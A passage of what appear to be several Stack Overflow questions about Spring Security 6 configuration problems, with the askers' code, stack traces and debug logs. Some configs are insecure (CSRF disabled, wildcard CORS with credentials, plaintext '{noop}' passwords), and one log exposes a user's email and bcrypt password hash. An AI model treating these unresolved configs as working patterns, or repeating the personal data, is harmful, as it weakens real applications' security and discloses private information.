                .tokenEndpoint( Customizer.withDefaults() )
                .tokenGenerator( new OAuth2AccessTokenGenerator() )
                .authorizationServerSettings( authorizationServerSettings( ) )
                .registeredClientRepository( registeredClientRepository() )
                .authorizationService( authorizationService() );
//              .setBuilder( http );


        return http.build();
    }

}
</code></pre>
<p>Here is my configuration code.</p>
<p>And I checked basic token authentication was applied.</p>
<p>but when i called token endpoint url (&quot;http://localhost:8000/oauth2/v1/token) with grant_type = client_credentials, the server return 404 error.</p>
<p>I couldn't find why they return 404 error.</p>
<p>please let me know how to set token url.</p>
<p>here is my debug log.</p>
<pre><code>2024-02-27T16:07:12.942+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Securing POST /oauth2/v1/token
2024-02-27T16:07:13.147+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.s.a.dao.DaoAuthenticationProvider    : Authenticated user
2024-02-27T16:07:13.148+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.s.w.a.www.BasicAuthenticationFilter  : Set SecurityContextHolder to UsernamePasswordAuthenticationToken [Principal=org.springframework.security.core.userdetails.User [Username=user, Password=[PROTECTED], Enabled=true, AccountNonExpired=true, CredentialsNonExpired=true, AccountNonLocked=true, Granted Authorities=[]], Credentials=[PROTECTED], Authenticated=true, Details=WebAuthenticationDetails [RemoteIpAddress=0:0:0:0:0:0:0:1, SessionId=null], Granted Authorities=[]]
2024-02-27T16:07:13.150+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Secured POST /oauth2/v1/token
2024-02-27T16:07:13.161+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Securing POST /error
2024-02-27T16:07:13.161+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Secured POST /error

</code></pre>
"
"<p>if you see below , you would see my code and i find that my one particular controller api is keeping going to AuthenticationEntryPoint in spring security...
so i tried another api in controller , but it worked.. so i am wondering why it keeps going to EntryPoint..</p>
<p>does this issue happen because of exception in jwtfilter??</p>
<pre><code>@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
            .cors(corsConfigurer -&gt; corsConfigurer.configurationSource(corsConfigurationSource()))
            .csrf(AbstractHttpConfigurer::disable)
            .formLogin(AbstractHttpConfigurer::disable)
            .authorizeHttpRequests( auth -&gt; auth
                    .requestMatchers(ALLOWED_URIS).permitAll() // 특정 경로 인증 미요구
                    .anyRequest().authenticated() // 나머지 경로는 인증 요구
            )

            .exceptionHandling(exceptionHandling -&gt;
                    exceptionHandling
                            .authenticationEntryPoint(authFailureHandler)
            )


            .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)// JwtFilter 추가
            .addFilterBefore(exceptionHandlerFilter, JwtFilter.class) // ExceptionHandlerFilter 추가
            .oauth2Login( customizer -&gt;
                    customizer
                            .failureHandler(authFailureHandler)
                            .successHandler(oAuth2SuccessHandler)
                            .userInfoEndpoint(userInfoEndpoint -&gt;
                                    userInfoEndpoint.userService(customOAuth2Service))
            );

    return http.build();
}


///method of jwtfilter 
@Override
protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
    String authorizationHeader = request.getHeader(AUTHORIZATION_HEADER);
    System.out.println(&quot;jwtfilterrrr&quot;+SecurityContextHolder.getContext().getAuthentication());
    //토큰이 없는경우
    if(!StringUtils.hasText(authorizationHeader)){
        doFilter(request, response, filterChain);
        return;
    }

    //Bear로 시작하지 않는 경우
    if(!authorizationHeader.startsWith(BEARER_PREFIX)){
        doFilter(request, response, filterChain);
        return;
    }

    //jwt추출
    String accessToken = authorizationHeader.split(&quot; &quot;)[1];

    //엑세스 토큰 검증
    Jws&lt;Claims&gt; claimsJws = jwtUtils.validateAccessToken(accessToken);
    if(claimsJws != null){
        User user = userRepository.findById(jwtUtils.getUserIdByAccessToken(accessToken))
                .orElseThrow(() -&gt; new UserException(UserErrorCode.NOT_EXISTS_USER));

        UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(user, null, user.getAuthorities());
        SecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthenticationToken);
        log.info(&quot;jwt_securitycontext&quot;+SecurityContextHolder.getContext().toString());
    }

    filterChain.doFilter(request, response);
}
</code></pre>
<p>i already found that my user info assigned to springsecuritycontextHolder..</p>
<p>jwt_securitycontextSecurityContextImpl [Authentication=UsernamePasswordAuthenticationToken [Principal=User(id=3, email=junwon1133@naver.com, name=null, nickname=null, password=$2a$10$Hw9a7TQS9I2DRKvqIPIrT.2xrnZwO.NE2rDGjN5ToKICO2mP2JbN6, createAt=2024-02-15T07:30:10, provider=GENERAL, role=ADMIN, status=null, profileImgUrl=null, gender=null, birthdateYear=null, birthdateMonth=null), Credentials=[PROTECTED], Authenticated=true, Details=null, Granted Authorities=[com.sail.back.user.model.entity.User$$Lambda$2285/0x0000018d89f448d0@463f2716]]]</p>
"
"<p>I'm actually encountering a problem with my view, in fact I'm tryng to display a pdf or at least a download button. The problem is that I cannot access the &quot;pdf&quot; directory that I created. He is as the same level as my JS directory.</p>
<p>The path is src/main /resources/static/pdf. When I check on my devtools, the request to the pdf is 404 error. and I'm tryng to reach them with relative path.</p>
<p><a href=""https://i.stack.imgur.com/h3wTP.png"" rel=""nofollow noreferrer"">Path</a></p>
<p>Does anyone know how to solve this.</p>
<p>Here is my Security config :</p>
<pre><code>@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public BCryptPasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    /**
     * Laisse le controle aux controllers
     */
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http.authorizeHttpRequests((auth) -&gt; auth.anyRequest().permitAll()).build();
    }
}
</code></pre>
"
"<p>I have a problem with Spring Security. When I'm trying to authenticate an user on my application, I'm redirected back to signin.html. After debugging, I saw that even if I'm instantiating SecurityContextHolder.getContext().setAuthentication(); , SecurityContext is null.</p>
<p>This is my authentication code:</p>
<pre><code>public boolean dbAuthentication(String username, String password) {
            Boolean response = false;
            try {
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                response = passwordEncoder.matches(password, userDetails.getPassword());
                if(response) {
                    UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(userDetails, password, userDetails.getAuthorities());
                    if (usernamePasswordAuthenticationToken.isAuthenticated()) {
                        SecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthenticationToken);
                    }
                }
            } catch(Exception e) {
                response = false;
            }
            return response;
        }

</code></pre>
<p>This is my WebSecurityConfig class:</p>
<pre><code>   public class WebSecurityConfig {

    @Autowired
    private AppConfig appConfig;

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public WebSecurityCustomizer webSecurityCustomizer() throws Exception{
        return (web) -&gt; web.ignoring().requestMatchers( &quot;/build/**&quot;,&quot;/ext/**&quot;,&quot;/resources/**&quot;,&quot;../../../resources/**&quot;,&quot;/../../resources/**&quot;,&quot;../resources/**&quot;);
    }


    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
            http.
                    csrf(AbstractHttpConfigurer::disable).
                    headers(headers -&gt; headers.frameOptions(HeadersConfigurer.FrameOptionsConfig::sameOrigin))
                    .authorizeHttpRequests(a -&gt; a
                            .requestMatchers(&quot;/app/**&quot;).permitAll()
                            .requestMatchers(&quot;/signin.html&quot;).permitAll()
                            .requestMatchers(&quot;/forgot.html&quot;).permitAll()
                            .requestMatchers(&quot;/getCustomCss/**&quot;).permitAll()
                            .requestMatchers(&quot;/oauth2sso/**&quot;).permitAll()
                            .requestMatchers(&quot;/isLdapEnabled/**&quot;).permitAll()
                            .requestMatchers(&quot;/isSamlEnabled/**&quot;).permitAll()
                            .requestMatchers(&quot;/prefetchFiles*&quot;).permitAll()
                            .requestMatchers(&quot;/languages/getLanguages*&quot;).permitAll()
                            .requestMatchers(&quot;/getSessionTimeout&quot;).permitAll()
                            .requestMatchers(&quot;/wakeUpElastic/**&quot;).permitAll()
                            .requestMatchers(&quot;/forgotPassword*&quot;).permitAll()
                            .requestMatchers(&quot;/recoverPassword*&quot;).permitAll()
                            .requestMatchers(&quot;/authenticate*&quot;).permitAll()
                            .requestMatchers(&quot;/build/**&quot;).permitAll()
                            .requestMatchers(&quot;/ext/**&quot;).permitAll()
                            .requestMatchers(&quot;/resources/**&quot;).permitAll()
                            .requestMatchers(&quot;/logout*&quot;).permitAll()
                            .anyRequest().authenticated()
                    ).formLogin(formLogin -&gt; formLogin.loginPage(&quot;/signin.html&quot;).
                            usernameParameter(&quot;username&quot;)
                            .passwordParameter(&quot;password&quot;)
                            .defaultSuccessUrl(&quot;/index.html&quot;, true)
                            .failureUrl(&quot;/signin.html?error=true&quot;))
                    .logout(l -&gt; l
                            .invalidateHttpSession(true)
                            .deleteCookies(&quot;SESSIONID&quot;)
                            .logoutUrl(&quot;/signin.html?logout&quot;));
        return http.build();
    }
}
</code></pre>
<p>This problem occurs when I'm trying to update the SpringSecurity version to latest one and I tried to follow every instruction from official documentation, but without success.</p>
"
"<p>With Reference to spring-security-saml2-service-provider here:
<a href=""https://mvnrepository.com/artifact/org.springframework.security/spring-security-saml2-service-provider"" rel=""nofollow noreferrer"">https://mvnrepository.com/artifact/org.springframework.security/spring-security-saml2-service-provider</a>
<a href=""https://github.com/spring-projects/spring-security/tree/main/saml2/saml2-service-provider"" rel=""nofollow noreferrer"">https://github.com/spring-projects/spring-security/tree/main/saml2/saml2-service-provider</a></p>
<p>and the older Spring Security SAML Extension here:
<a href=""https://docs.spring.io/spring-security-saml/docs/current/reference/pdf/spring-security-saml-reference.pdf"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-security-saml/docs/current/reference/pdf/spring-security-saml-reference.pdf</a></p>
<p>Does anyone know if it's possible to implement SAML with Microsoft Entra ID Enterprise Apps for Java Web apps that were built without Spring (aka Non-Spring Web Apps)?</p>
<p>I do not have access to the Java Source code as these are war files that once deployed the only files I can modify are web.xml, server.xml, .properties files, and context.xml, etc.</p>
<p>Using OpenJDK11 with Tomcat 9 or TomEE as the servlet container:
<a href=""https://github.com/adoptium/temurin11-binaries/releases/download/jdk-11.0.20%2B8/OpenJDK11U-jdk_x64_windows_hotspot_11.0.20_8.zip"" rel=""nofollow noreferrer"">https://github.com/adoptium/temurin11-binaries/releases/download/jdk-11.0.20%2B8/OpenJDK11U-jdk_x64_windows_hotspot_11.0.20_8.zip</a></p>
<p>Thank you for any insight.</p>
<p>Looking for insight.
Tried the sample, but seems it's expecting access to source code:
<a href=""https://github.com/spring-projects/spring-security-samples/tree/main/servlet/spring-boot/java/saml2/login"" rel=""nofollow noreferrer"">https://github.com/spring-projects/spring-security-samples/tree/main/servlet/spring-boot/java/saml2/login</a></p>
"
"<p>I doing a migration from Spring boot 2 appplition to Spring boot 3,
I did all changes in the Spring Security and the application start fine. When I call my endpoint I get a PatternParseException and I think it's because of my Spring Security configuration.</p>
<p>You can find bellow my Spring security configuration and web configuration.</p>
<pre><code>org.springframework.web.util.pattern.PatternParseException: No more pattern data allowed after {*...} or ** pattern element
        at org.springframework.web.util.pattern.InternalPathPatternParser.peekDoubleWildcard(InternalPathPatternParser.java:250) ~[spring-web-6.0.11.jar!/:6.0.11]
        at org.springframework.web.util.pattern.InternalPathPatternParser.parse(InternalPathPatternParser.java:113) ~[spring-web-6.0.11.jar!/:6.0.11]
        at org.springframework.web.util.pattern.PathPatternParser.parse(PathPatternParser.java:129) ~[spring-web-6.0.11.jar!/:6.0.11]
        at org.springframework.web.servlet.handler.PathPatternMatchableHandlerMapping.lambda$match$0(PathPatternMatchableHandlerMapping.java:64) ~[spring-webmvc-6.0.11.jar!/:6.0.11]
        at java.base/java.util.concurrent.ConcurrentHashMap.computeIfAbsent(ConcurrentHashMap.java:1708) ~[na:na]
</code></pre>
<p>SecurityConfig</p>
<pre><code>package com.omb.restcore.security;

import com.omb.core.security.utils.JasyptEncryptorDecryptor;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.env.AbstractEnvironment;
import org.springframework.core.env.Environment;
import org.springframework.core.env.MapPropertySource;
import org.springframework.core.env.PropertySource;
import org.springframework.http.HttpMethod;
import org.springframework.security.config.Customizer;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.authentication.configurers.provisioning.InMemoryUserDetailsManagerConfigurer;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;

import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.logging.Logger;

@Configuration
@EnableGlobalMethodSecurity(prePostEnabled = true)
public class SecurityConfig {
    private static final Logger LOG = Logger.getLogger(SecurityConfig.class.getName());
    private static final String HEALTHCHECK_URL = &quot;/**/healthCheck&quot;;
    private static final String[] ALLOW_LIST = {
            HEALTHCHECK_URL, &quot;/**/v3/api-docs&quot;, &quot;/**/swagger-resources/**&quot;,
            &quot;/**/swagger-ui.html&quot;, &quot;/**/webjars/**&quot;, &quot;/**/csrf&quot;, &quot;/&quot;, &quot;/**/css/**&quot;
    };
    @Value(&quot;${enableHttpAuthentication:true}&quot;)
    private boolean enableHttpAuthentication;
    @Value(&quot;${enableLoginEncryption}&quot;)
    private boolean enableLoginEncryption;
    @Value(&quot;${allowAnonymousAccessToSwaggerDoc}&quot;)
    private boolean allowAnonymousAccessToSwaggerDoc;
    @Autowired
    private Environment environment;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        if (enableHttpAuthentication) {
            // Accept only BASIC authenticated requests except for the given ressources, which are accessible without
            // authentication
            if (allowAnonymousAccessToSwaggerDoc) {
                http.csrf(csrf -&gt; csrf.disable())
                        .authorizeHttpRequests(auth -&gt; auth.requestMatchers(ALLOW_LIST).permitAll()
                                .requestMatchers(HttpMethod.OPTIONS, &quot;/**&quot;).permitAll()
                                .anyRequest().authenticated())
                        .httpBasic(Customizer.withDefaults());
            } else {
                http.csrf(csrf -&gt; csrf.disable())
                        .authorizeHttpRequests(auth -&gt; auth.requestMatchers(HEALTHCHECK_URL).permitAll()
                                .requestMatchers(HttpMethod.OPTIONS, &quot;/**&quot;).permitAll()
                                .anyRequest().authenticated())
                        .httpBasic(Customizer.withDefaults());
            }
            LOG.info(&quot;BASIC HTTP authentication enabled&quot;);
        } else {
            // Disable authentication on API usage
            http.csrf(csrf -&gt; csrf.disable())
                    .authorizeHttpRequests(auth -&gt; auth.anyRequest().anonymous());
            LOG.info(&quot;BASIC HTTP authentication disabled&quot;);
        }

        return http.build();
    }

    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(List.of(&quot;*&quot;));
        configuration.setAllowedMethods(List.of(&quot;*&quot;));
        configuration.setAllowCredentials(true);
        configuration.setAllowedHeaders(Arrays.asList(&quot;Authorization&quot;, &quot;Requestor-Type&quot;));
        configuration.setExposedHeaders(List.of(&quot;X-Get-Header&quot;));
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/**&quot;, configuration);
        return source;
    }

    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
        InMemoryUserDetailsManagerConfigurer&lt;AuthenticationManagerBuilder&gt; inMemoryAuth = auth.inMemoryAuthentication();

        for (PropertySource&lt;?&gt; propertySource : ((AbstractEnvironment) environment).getPropertySources()) {
            if (propertySource instanceof MapPropertySource) {
                Map&lt;String, Object&gt; properties = ((MapPropertySource) propertySource).getSource();
                java.util.regex.Pattern pattern = java.util.regex.Pattern.compile(&quot;user\\.(.*)\\.password&quot;);

                for (String k : properties.keySet()) {
                    java.util.regex.Matcher matcher = pattern.matcher(k);

                    if (matcher.find()) {
                        String user = matcher.group(1);
                        String pwd = properties.get(k).toString();

                        if (enableLoginEncryption) {
                            user = JasyptEncryptorDecryptor.decrypt(user);
                        }
                        pwd = JasyptEncryptorDecryptor.decrypt(pwd);

                        if (!StringUtils.isEmpty(pwd)) {
                            LOG.finest(&quot;Configured HTTP BASIC access rights for user &quot; + user);
                            inMemoryAuth.withUser(user).password(&quot;{noop}&quot; + pwd).roles(&quot;USER&quot;);
                        } else {
                            LOG.finest(&quot;Disabled HTTP BASIC access rights for user &quot; + user);
                        }
                    }
                }
            }
        }

        LOG.info(&quot;BASIC HTTP configuration done.&quot;);
    }
}
</code></pre>
<p>WebConfig</p>
<pre><code>package com.omb.gateway.security;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class WebConfig {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping(&quot;/**&quot;)
                        .allowedOriginPatterns(&quot;*&quot;)
                        .allowedHeaders(&quot;Requestor-Type&quot;)
                        .exposedHeaders(&quot;X-Get-Header&quot;)
                        .allowCredentials(true);
            }
        };
    }
}
</code></pre>
"
"<p>html:</p>
<pre><code>&lt;form th:action=&quot;@{/com/login}&quot; method=&quot;post&quot;&gt;
            &lt;label for=&quot;username&quot;&gt;User account:&lt;/label&gt;
            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;

            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;

                &lt;label for=&quot;remember_me&quot;&gt;
                    &lt;input type=&quot;checkbox&quot; id=&quot;remember_me&quot; name=&quot;remember_me&quot;&gt; Remember me
                &lt;/label&gt;
            &lt;a href=&quot;#&quot;&gt;Forget password?&lt;/a&gt;

            &lt;button type=&quot;submit&quot;&gt;Sign in&lt;/button&gt;
        &lt;/form&gt;
</code></pre>
<p>Security configure :</p>
<pre><code>@Configuration
@EnableWebSecurity
public class SecurityConfigure {

    private final RSAKeyProperties keys;

    public SecurityConfigure(RSAKeyProperties keys) {
        this.keys = keys;
    }
    
    
    @Autowired
    private CustomAuthenticationSuccessHandler customAuthenticationSuccessHandler;
    

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public AuthenticationManager authManager(UserDetailsService detailsService) {
        DaoAuthenticationProvider daoProvider = new DaoAuthenticationProvider();
        daoProvider.setUserDetailsService(detailsService);
        daoProvider.setPasswordEncoder(passwordEncoder());
        return new ProviderManager(daoProvider);
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {

        
        http.csrf(csrf -&gt; 
        csrf.disable())
        .authorizeHttpRequests(auth -&gt; {
            auth.requestMatchers(&quot;/auth/**&quot;, &quot;/com/**&quot;).permitAll();
            auth.requestMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;);
            auth.requestMatchers(&quot;/user/**&quot;).hasAnyRole(&quot;ADMIN&quot;, &quot;USER&quot;);
            auth.requestMatchers(&quot;/authenticated/**&quot;).hasAnyRole(&quot;ADMIN&quot;, &quot;USER&quot;);
            auth.anyRequest().authenticated();
        });
        
        http.formLogin(form -&gt; {
            form.loginPage(&quot;/com/loginHome&quot;);
            form.loginProcessingUrl(&quot;/com/login&quot;);
            form.defaultSuccessUrl(&quot;/authenticated/home&quot;);
            form.successHandler(customAuthenticationSuccessHandler);
        });
        

        http.sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS));

        http.oauth2ResourceServer(
                oauth2 -&gt; oauth2.jwt(jwt -&gt; jwt.jwtAuthenticationConverter(jwtAuthenticationConverter())));
        
        return http.build();
    }
    

    private Consumer&lt;OAuth2AuthorizationRequest.Builder&gt; authorizationRequestCustomizer() {
        return customizer -&gt; customizer
                    .additionalParameters(params -&gt; params.put(&quot;prompt&quot;, &quot;consent&quot;));
    }
    
    @Bean
    public JwtDecoder jwtDecoder() {
        return NimbusJwtDecoder.withPublicKey(keys.getPublicKey()).build();
    }

    @Bean
    public JwtEncoder jwtEncoder() {
        JWK jwk = new RSAKey.Builder(keys.getPublicKey()).privateKey(keys.getPrivateKey()).build();
        JWKSource&lt;SecurityContext&gt; jwks = new ImmutableJWKSet&lt;&gt;(new JWKSet(jwk));
        return new NimbusJwtEncoder(jwks);
    }

    @Bean
    public JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtGrantedAuthoritiesConverter jwtGrantedAuthoritiesConverter = new JwtGrantedAuthoritiesConverter();
        jwtGrantedAuthoritiesConverter.setAuthoritiesClaimName(&quot;roles&quot;);
        jwtGrantedAuthoritiesConverter.setAuthorityPrefix(&quot;ROLE_&quot;);

        JwtAuthenticationConverter jwtAuthenticationConverter = new JwtAuthenticationConverter();
        jwtAuthenticationConverter.setJwtGrantedAuthoritiesConverter(jwtGrantedAuthoritiesConverter);

        return jwtAuthenticationConverter;
    }
    

    @Bean
    public WebSecurityCustomizer webSecurityCustomizer() {
        return web -&gt; web.ignoring().requestMatchers(&quot;/css/*.css&quot;, &quot;/image/get/*&quot;, &quot;/image/get/carousel/*&quot;,
                &quot;/images/*&quot;, &quot;/images/logo/*&quot;, &quot;/js/*.js&quot;);
    }

}

</code></pre>
<p>controller:</p>
<pre><code>@Controller
@RequestMapping(&quot;/com&quot;)
@CrossOrigin(&quot;*&quot;)
public class CommonController {
    
    private SecurityContextRepository securityContextRepository =  new HttpSessionSecurityContextRepository();
    
    private final SecurityContextHolderStrategy securityContextHolderStrategy = SecurityContextHolder.getContextHolderStrategy();
    
    @Autowired
    private AuthenticationManager authenticationManager;
    
    @Autowired
    private AuthenticationService authenticationService;
    
    @GetMapping(&quot;/index&quot;)
    public String home() {
        return &quot;main/index2&quot;;
    }
    
    @GetMapping(&quot;/loginHome&quot;)
    public String loginPage() {
        return &quot;main/loginPage&quot;;
    }
        

    @PostMapping(&quot;/login&quot;)
    public String login(@RequestParam Map&lt;String, String&gt; loginInfo, HttpServletRequest request, HttpServletResponse response, Model m) {
        LoginResponseDTO loginUser = null;
        try {
            if(!MapUtils.isEmpty(loginInfo)) {
                loginUser = authenticationService.loginUser(loginInfo.get(&quot;username&quot;), loginInfo.get(&quot;password&quot;));
            } else {
                m.addAttribute(&quot;error&quot;, &quot;Invalid username or password&quot;);
                 return &quot;main/loginPage&quot;;
            }
            if(loginUser.getUser() != null) {
                UsernamePasswordAuthenticationToken token = UsernamePasswordAuthenticationToken.unauthenticated(
                        loginInfo.get(&quot;username&quot;), loginInfo.get(&quot;password&quot;));
                Authentication authentication = authenticationManager.authenticate(token);
                SecurityContext context = securityContextHolderStrategy.createEmptyContext();
                context.setAuthentication(authentication);
                securityContextHolderStrategy.setContext(context);
                securityContextRepository.saveContext(context, request, response);
                return &quot;redirect:/authenticated/home&quot;;
            } else {
                throw new UsernameNotFoundException(&quot;user not found&quot;);
            }
        } catch (UsernameNotFoundException e) {
          m.addAttribute(&quot;error&quot;, &quot;Invalid username or password&quot;);
          e.printStackTrace();
      } catch (Exception e) {
          m.addAttribute(&quot;error&quot;, &quot;Something went wrong. Please try again later.&quot;);
          e.printStackTrace();
      }
        return &quot;main/loginPage&quot;;
    }

    
}

</code></pre>
<p>Issue 1 :
When declare <code>form.loginProcessingUrl(&quot;/com/login&quot;);</code> that <code>/com/login</code> not event executed.</p>
<p>Issue 2:
When <code>form.loginProcessingUrl(&quot;/com/login&quot;);</code> not been declared. The <code>/com/login</code> will execute but will response 302. As following:
<a href=""https://i.stack.imgur.com/sLQ5w.png"" rel=""nofollow noreferrer"">enter image description here</a>
<a href=""https://i.stack.imgur.com/PeZHg.png"" rel=""nofollow noreferrer"">enter image description here</a></p>
<p>And the console shows :</p>
<pre><code>2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36m.s.r.w.a.BearerTokenAuthenticationFilter[0;39m [2m:[0;39m Did not process request since did not find bearer token
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36mo.s.security.web.FilterChainProxy       [0;39m [2m:[0;39m Invoking RequestCacheAwareFilter (9/14)
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36mo.s.security.web.FilterChainProxy       [0;39m [2m:[0;39m Invoking SecurityContextHolderAwareRequestFilter (10/14)
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36mo.s.security.web.FilterChainProxy       [0;39m [2m:[0;39m Invoking AnonymousAuthenticationFilter (11/14)
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36mo.s.security.web.FilterChainProxy       [0;39m [2m:[0;39m Invoking SessionManagementFilter (12/14)
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36m.s.s.w.c.SupplierDeferredSecurityContext[0;39m [2m:[0;39m Created SecurityContextImpl [Null authentication]
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36mo.s.s.w.a.AnonymousAuthenticationFilter [0;39m [2m:[0;39m Set SecurityContextHolder to AnonymousAuthenticationToken [Principal=anonymousUser, Credentials=[PROTECTED], Authenticated=true, Details=WebAuthenticationDetails [RemoteIpAddress=0:0:0:0:0:0:0:1, SessionId=600F3CB34A220619D8A4042AB3AA44F3], Granted Authorities=[ROLE_ANONYMOUS]]
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36mo.s.security.web.FilterChainProxy       [0;39m [2m:[0;39m Invoking ExceptionTranslationFilter (13/14)
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36mo.s.security.web.FilterChainProxy       [0;39m [2m:[0;39m Invoking AuthorizationFilter (14/14)
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36mestMatcherDelegatingAuthorizationManager[0;39m [2m:[0;39m Authorizing SecurityContextHolderAwareRequestWrapper[ org.springframework.security.web.header.HeaderWriterFilter$HeaderWriterRequest@34c2aac6]
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36mestMatcherDelegatingAuthorizationManager[0;39m [2m:[0;39m Checking authorization on SecurityContextHolderAwareRequestWrapper[ org.springframework.security.web.header.HeaderWriterFilter$HeaderWriterRequest@34c2aac6] using AuthorityAuthorizationManager[authorities=[ROLE_ADMIN, ROLE_USER]]
[2m2024-02-28T08:26:45.099+08:00[0;39m [32mTRACE[0;39m [35m25656[0;39m [2m---[0;39m [2m[io-8080-exec-10][0;39m [2m[0;39m[36mo.s.s.w.a.ExceptionTranslationFilter    [0;39m [2m:[0;39m Sending AnonymousAuthenticationToken [Principal=anonymousUser, Credentials=[PROTECTED], Authenticated=true, Details=WebAuthenticationDetails [RemoteIpAddress=0:0:0:0:0:0:0:1, SessionId=600F3CB34A220619D8A4042AB3AA44F3], Granted Authorities=[ROLE_ANONYMOUS]] to authentication entry point since access is denied

org.springframework.security.access.AccessDeniedException: Access Denied
    at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:98) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
